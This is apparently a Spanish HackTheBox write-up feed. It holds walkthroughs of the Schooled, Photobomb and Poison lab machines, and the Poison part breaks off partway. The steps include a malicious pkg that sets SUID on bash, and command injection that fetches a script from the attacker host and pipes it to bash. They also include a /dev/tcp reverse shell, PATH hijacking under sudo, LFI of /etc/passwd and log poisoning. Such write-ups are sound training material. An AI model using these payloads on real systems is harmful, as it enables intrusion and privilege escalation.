ED25519 key fingerprint is SHA256:d9VHI+sFsz7EhIePN0ir7HNAMuj8q3kVvpaQlTOtkU8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.234<span class="s1">' (ED25519) to the list of known hosts.
(jamie@10.10.10.234) Password for jamie@Schooled:
Last login: Fri Oct 29 12:35:59 2021 from 10.10.14.23
FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

To change this login announcement, see motd(5).
You can upload the dmesg of your system to help developers get an overview of commonly
used hardware and peripherals for FreeBSD. Use the curl package to upload it like this:
curl -v -d "nickname=$USER" -d "description=FreeBSD/$(uname -m) on \
$(kenv smbios.system.maker) $(kenv smbios.system.product)" -d "do=addd" \
--data-urlencode '</span>dmesg@/var/run/dmesg.boot<span class="s1">' http://dmesgd.nycbug.org/index.cgi
jamie@Schooled:~ $ export TERM=xterm
</span></code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">cat </span>user.txt 
e8c13c552c9960e9dd4a5d77eb173e8d
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Podemos ejecutar esto como cualquier usuario y sin contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
User jamie may run the following commands on Schooled:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg <span class="nb">install</span> <span class="k">*</span>
jamie@Schooled:~ <span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>
    <p><a href="https://gtfobins.github.io/gtfobins/pkg/#sudo">https://gtfobins.github.io/gtfobins/pkg/#sudo</a>.</p>
  </li>
  <li>
    <p>Necesitas instalar esto <a href="https://github.com/jordansissel/fpm">https://github.com/jordansissel/fpm</a>.</p>
  </li>
  <li>
    <p>Todo esto lo vamos a hacer en nuestra maquina de atacante.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
<span class="nb">echo</span> <span class="s1">'chmod u+s /bin/bash'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/x.sh
                                                       
❯  fpm <span class="nt">-n</span> x <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> freebsd <span class="nt">-a</span> all <span class="nt">--before-install</span> <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span class="s2">"x-1.0.txz"</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo pasamos ala máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp <span class="nv">$ </span>curl http://10.10.14.13/x-1.0.txz <span class="nt">--output</span> x-1.0.txz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 <span class="nt">--</span>:--:-- 100   512  100   512    0     0   1391      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--  1395
jamie@Schooled:/tmp <span class="nv">$ </span><span class="nb">ls
</span>mysql.sock		mysqlx.sock.lock
mysql.sock.lock		x-1.0.txz
mysqlx.sock
jamie@Schooled:/tmp <span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Lo ejecutamos rapido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp/repo <span class="nv">$ </span><span class="nb">sudo </span>pkg <span class="nb">install</span> <span class="nt">-y</span> <span class="nt">--no-repo-update</span> ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. <span class="s1">'pkg update'</span> required
Checking integrity... <span class="k">done</span> <span class="o">(</span>0 conflicting<span class="o">)</span>
The following 1 package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of 0 checked<span class="o">)</span>:

New packages to be INSTALLED:
	x: 1.0

Number of packages to be installed: 1
<span class="o">[</span>1/1] Installing x-1.0...
Extracting x-1.0: 100%
jamie@Schooled:/tmp/repo <span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Ahora es SUID.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp/repo <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/bash
<span class="nt">-rwsr-xr-x</span>  1 root  wheel  941288 Feb 20  2021 /usr/local/bin/bash
jamie@Schooled:/tmp/repo <span class="nv">$ </span>
</code></pre></div></div>

<h2 id="shell-as-root-and-root-flag">Shell as root and root flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp/repo <span class="nv">$ </span>bash <span class="nt">-p</span>
<span class="o">[</span>jamie@Schooled /tmp/repo]# <span class="nb">whoami
</span>root
<span class="o">[</span>jamie@Schooled /tmp/repo]# <span class="nb">cd</span> /root
<span class="o">[</span>jamie@Schooled /root]# <span class="nb">cat </span>root.txt 
b7e535ff5ba87d26e35cccd47f06625a
<span class="o">[</span>jamie@Schooled /root]# 
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Photobomb (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html" rel="alternate" type="text/html" title="HackTheBox - Photobomb (easy)" /><published>2024-09-29T00:00:00-06:00</published><updated>2024-09-29T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png" />
</p>

<ul>
  <li>Photobomb is an easy Linux machine where plaintext credentials are used to access an internal web application with a <code class="language-plaintext highlighter-rouge">Download</code> functionality that is vulnerable to a blind command injection. Once a foothold as the machine main user is established, a poorly configured shell script that references binaries without their full paths is leveraged to obtain escalated privileges, as it can be ran with <code class="language-plaintext highlighter-rouge">sudo</code>.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn ../nmap/targeted
<span class="c"># Nmap 7.94SVN scan initiated Sun Sep 29 12:39:55 2024 as: nmap -sCV -p22,80 -oN targeted 10.10.11.182</span>
Nmap scan report <span class="k">for </span>10.10.11.182
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d <span class="o">(</span>RSA<span class="o">)</span>
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Sep 29 12:40:32 2024 -- 1 IP address (1 host up) scanned in 36.79 seconds</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Agregamos el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.182 photobomb.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/1.png" />
</p>

<ul>
  <li>
    <p>Nos dicen que demos <code class="language-plaintext highlighter-rouge">click</code> en la parte morada y que las credenciales las encontraremos en nuestro paquete de inicio.</p>
  </li>
  <li>
    <p>Si damos <code class="language-plaintext highlighter-rouge">click</code> nos piden credenciales pero por el momento no tenemos ningunas.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/2.png" />
</p>

<ul>
  <li>Si revisamos el código fuente en el archivo <code class="language-plaintext highlighter-rouge">Javascript</code> encontramos lo que parecen ser credenciales.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/3.png" />
</p>

<ul>
  <li>Si las probamos nos deja conectarnos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/4.png" />
</p>

<h2 id="shell-as-wizard">Shell as wizard</h2>

<ul>
  <li>Ahora lo que vamos a hacer es interceptar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> la petición al momento de dar <code class="language-plaintext highlighter-rouge">click</code> en el botón rojo para ver como viaja la petición.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/5.png" />
</p>

<ul>
  <li>Después de probar varias inyecciones en la parte de <code class="language-plaintext highlighter-rouge">filetype</code> podemos concatenar un comando en esta ocasión me hago una petición a un script el cual por el momento no existe y me llega la petición.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/6.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.182 - - <span class="o">[</span>29/Sep/2024 13:14:05] code 404, message File not found
10.10.11.182 - - <span class="o">[</span>29/Sep/2024 13:14:05] <span class="s2">"GET /shell.sh HTTP/1.1"</span> 404 -
</code></pre></div></div>

<ul>
  <li>Sabiendo que podemos inyectar comandos vamos a crear el archivo para obtener una reverse Shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>shell.sh
───────┬──────────────────────────────────────────────────
       │ File: shell.sh
───────┼──────────────────────────────────────────────────
   1   │ <span class="c">#!/bin/bash</span>
   2   │ 
   3   │ bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.30/443 0&gt;&amp;1
───────┴──────────────────────────────────────────────────
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>
    <p>Y simplemente enviamos la petición.</p>
  </li>
  <li>
    <p>Agregamos <code class="language-plaintext highlighter-rouge">| bash</code> para que lo interprete.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/7.png" />
</p>

<ul>
  <li>Nos llega la Shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.30] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.182] 43738
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>697<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
wizard@photobomb:~/photobomb<span class="nv">$ </span><span class="nb">whoami
whoami
</span>wizard
wizard@photobomb:~/photobomb<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Ahora hacemos un tratamiento de la <code class="language-plaintext highlighter-rouge">tty</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~/photobomb<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
wizard@photobomb:~/photobomb<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 443
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
                              reset xterm
ENTER
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
c2dd57cf27062d9098da457334b87181
wizard@photobomb:~<span class="nv">$ </span>
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>No vemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:/<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/umount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</code></pre></div></div>

<ul>
  <li>Podemos correr ese script como <code class="language-plaintext highlighter-rouge">root</code> sin proporcionar contraseñas y <code class="language-plaintext highlighter-rouge">setear</code> variables de entorno.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>wizard on photobomb:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User wizard may run the following commands on photobomb:
    <span class="o">(</span>root<span class="o">)</span> SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:/<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Con <code class="language-plaintext highlighter-rouge">find</code> esta buscando todos los archivos con extensión <code class="language-plaintext highlighter-rouge">".jpg"</code> en el directorio <code class="language-plaintext highlighter-rouge">"source_images"</code> y sus subdirectorios, y cambia el propietario y grupo de cada archivo encontrado a <code class="language-plaintext highlighter-rouge">"root:root"</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:/<span class="nv">$ </span><span class="nb">cat</span> /opt/cleanup.sh 
<span class="c">#!/bin/bash</span>
<span class="nb">.</span> /opt/.bashrc
<span class="nb">cd</span> /home/wizard/photobomb

<span class="c"># clean up log files</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="o">[</span> <span class="nt">-L</span> log/photobomb.log <span class="o">]</span>
<span class="k">then</span>
  /bin/cat log/photobomb.log <span class="o">&gt;</span> log/photobomb.log.old
  /usr/bin/truncate <span class="nt">-s0</span> log/photobomb.log
<span class="k">fi</span>

<span class="c"># protect the priceless originals</span>
find source_images <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'*.jpg'</span> <span class="nt">-exec</span> <span class="nb">chown </span>root:root <span class="o">{}</span> <span class="se">\;</span>
</code></pre></div></div>

<ul>
  <li>Tenemos la capacidad de modificar variables como el <code class="language-plaintext highlighter-rouge">'path'</code> para utilizar un comando <code class="language-plaintext highlighter-rouge">'find'</code> personalizado. Además, si ejecutamos el comando <code class="language-plaintext highlighter-rouge">'find'</code> con privilegios de administrador, el <code class="language-plaintext highlighter-rouge">'find'</code> se ejecutará con permisos de <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/Z3o0Y2kMoeU?si=Ifo5r-wcDUlddTBk" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></center>

<ul>
  <li>Vamos a darnos una <code class="language-plaintext highlighter-rouge">bash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~<span class="nv">$ </span><span class="nb">echo </span>bash <span class="o">&gt;</span> find
wizard@photobomb:~<span class="nv">$ </span><span class="nb">chmod</span> +x find
</code></pre></div></div>

<ul>
  <li>Ahora modificamos el <code class="language-plaintext highlighter-rouge">path</code> temporalmente para dar prioridad al directorio actual.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PWD</span>:<span class="nv">$PATH</span> /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# <span class="nb">whoami
</span>root
root@photobomb:/home/wizard/photobomb# 
</code></pre></div></div>

<h2 id="root-flag">root flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@photobomb:/home/wizard/photobomb# <span class="nb">cat</span> /root/root.txt
b740fbec8fa61254b2467d424ac7aaaa
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Poison (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/09/08/poison.html" rel="alternate" type="text/html" title="HackTheBox - Poison (medium)" /><published>2024-09-08T00:00:00-06:00</published><updated>2024-09-08T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/09/08/poison</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/09/08/poison.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/453800925395b3a5b14099e005fb5a77.png" />
</p>

<ul>
  <li>Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.84 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-09-08 12:00 CST
Stats: 0:00:06 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>0 up<span class="o">)</span>, 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% <span class="k">done
</span>Nmap scan report <span class="k">for </span>10.10.10.84
Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 <span class="o">(</span>FreeBSD 20161230<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb <span class="o">(</span>RSA<span class="o">)</span>
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/5.6.32<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto y esta corriendo un servicio web estas son las tecnologías que esta corriendo.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.84</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.84</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">29</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">FreeBSD</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">29</span> <span class="p">(</span><span class="no">FreeBSD</span><span class="p">)</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">5.6</span><span class="o">.</span><span class="mi">32</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.84</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">5.6</span><span class="o">.</span><span class="mi">32</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">5.6</span><span class="o">.</span><span class="mi">32</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Vemos algunas rutas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">--script</span><span class="o">=</span>http-enum <span class="nt">-p80</span> 10.10.10.84 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-09-08 12:01 CST
Nmap scan report <span class="k">for </span>10.10.10.84
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /info.php: Possible information file
|_  /phpinfo.php: Possible information file
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/1.png" />
</p>

<ul>
  <li>
    <p>Nos dicen que la web funciona para probar scripts en PHP.</p>
  </li>
  <li>
    <p>Si damos click en Submit sin subir ningún tipo de contenido vemos esta respuesta.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/2.png" />
</p>

<ul>
  <li>Además en la <code class="language-plaintext highlighter-rouge">url</code> vemos que mediante un parámetro llamado <code class="language-plaintext highlighter-rouge">file</code> se ve que este es el encargado de apuntar los archivos que tenemos que indicar y como no le indicamos nada pues no esta apuntando a nada es por eso que nos da error.</li>
</ul>

<h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2>

<ul>
  <li>Por el parámetro podemos probar con un LFI para ver si podemos leer archivos en este caso el mas conocido el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> para ver los usuarios en el sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://10.10.10.84/browse.php?file=/etc/passwd'</span>
<span class="c"># $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $</span>
<span class="c">#</span>
root:<span class="k">*</span>:0:0:Charlie &amp;:/root:/bin/csh
toor:<span class="k">*</span>:0:0:Bourne-again Superuser:/root:
daemon:<span class="k">*</span>:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:<span class="k">*</span>:2:5:System &amp;:/:/usr/sbin/nologin
bin:<span class="k">*</span>:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
<span class="nb">tty</span>:<span class="k">*</span>:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:<span class="k">*</span>:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:<span class="k">*</span>:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:<span class="k">*</span>:8:8:News Subsystem:/:/usr/sbin/nologin
man:<span class="k">*</span>:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:<span class="k">*</span>:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:<span class="k">*</span>:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:<span class="k">*</span>:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
<span class="nb">bind</span>:<span class="k">*</span>:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:<span class="k">*</span>:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:<span class="k">*</span>:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:<span class="k">*</span>:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:<span class="k">*</span>:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:<span class="k">*</span>:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:<span class="k">*</span>:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:<span class="k">*</span>:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:<span class="k">*</span>:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:<span class="k">*</span>:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:<span class="k">*</span>:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:<span class="k">*</span>:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:<span class="k">*</span>:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:<span class="k">*</span>:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:<span class="k">*</span>:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:<span class="k">*</span>:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:<span class="k">*</span>:1001:1001:charix:/home/charix:/bin/csh
</code></pre></div></div>

<h2 id="log-poisoning">Log Poisoning</h2>

<ul>
  <li>
    <p>Vemos que se esta empleando <code class="language-plaintext highlighter-rouge">FreeBSD</code> <a href="https://www.freebsd.org/">https://www.freebsd.org/</a>.</p>
  </li>
  <li>
    <p>Para convertir un LFI a un RCE podemos hacer un <code class="language-plaintext highlighter-rouge">Log Poisoning</code> para ver los logs tenemos que ser capaces de ver esta ruta <code class="language-plaintext highlighter-rouge">/var/log/apache2</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://10.10.10.84/browse.php?file=/var/log'</span>
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  include<span class="o">(</span>/var/log<span class="o">)</span>: failed to open stream: Resource temporarily unavailable <span class="k">in</span> &lt;b&gt;/usr/local/www/apache24/data/browse.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
